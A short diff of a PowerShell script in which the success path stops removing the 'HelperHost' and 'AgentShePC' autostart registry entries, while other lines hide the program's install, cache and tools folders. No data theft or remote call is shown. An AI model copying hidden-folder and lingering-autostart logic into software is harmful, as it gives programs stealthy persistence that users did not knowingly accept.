@@ -109,10 +109,6 @@ function Clear-LegacySidecars {
 
 function Finish-Ok {
   Clear-LegacySidecars
-  try {
-    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name HelperHost,AgentShePC -Force -EA SilentlyContinue
-    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run' -Name HelperHost,AgentShePC -Force -EA SilentlyContinue
-  } catch {}
   try { Hide-HH $Dir; Hide-HH $Cache; Hide-HH (Join-Path $Dir 'tools') } catch {}
   Write-Output 'OK'
   try { Clear-ResumeTasks } catch {}
